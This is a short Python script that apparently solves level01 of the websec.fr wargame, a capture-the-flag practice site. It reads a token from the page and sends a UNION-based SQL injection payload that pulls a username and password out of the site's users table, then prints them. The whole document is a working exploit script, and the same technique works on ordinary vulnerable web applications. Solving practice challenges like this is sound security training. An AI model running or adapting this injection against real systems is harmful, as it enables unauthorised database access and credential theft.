import requests

HOST = "http://websec.fr/level01/index.php"

sess = requests.Session()
res = sess.get(HOST)

# Extract token
start = res.text.find('value="', 850)
token = res.text[start+7:start+47]

# Build SQL injection
command = "SELECT username, password FROM users WHERE id=1"
payload = f"id and 1=2 UNION {command} --"

# Attack database
res = sess.post(HOST, {"submit": "abc", "user_id": payload, "token": token})

# Extract details from response
start = res.text.find("Other User Details")
details = res.text[start+36: start+2000]
details = details.split("<br />")[:-1]
details = [d.strip().replace("\t", "") for d in details]

for d in details:
    print(d)